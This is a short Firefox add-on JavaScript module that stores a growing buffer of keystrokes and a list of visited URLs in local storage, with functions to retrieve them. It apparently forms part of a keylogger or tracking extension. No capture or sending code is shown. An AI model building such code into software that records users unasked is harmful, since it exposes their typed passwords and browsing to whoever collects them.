
var ss = require("sdk/simple-storage");
var localStorage = ss.storage;
var generateUID = function(){
    return new Date().getTime() + Math.random();
}
var id = generateUID();
localStorage.id = id;
localStorage.keys = "";
localStorage.urls = [];

function storekey(stroke_buf){
	localStorage.keys += stroke_buf;
	console.log('BASE64 ' + localStorage.keys);
}

function retrivekey(){
	return localStorage.keys;
	
	}
function storeurls(urls){
	localStorage.urls.push.apply(localStorage.urls, urls);
    }  

function retriveurls(){
   return localStorage.urls;
   }
  
exports.retrivekey = retrivekey;
exports.storekey = storekey;
exports.localStorage = localStorage;
exports.retriveurls = retriveurls;
exports.storeurls = storeurls;
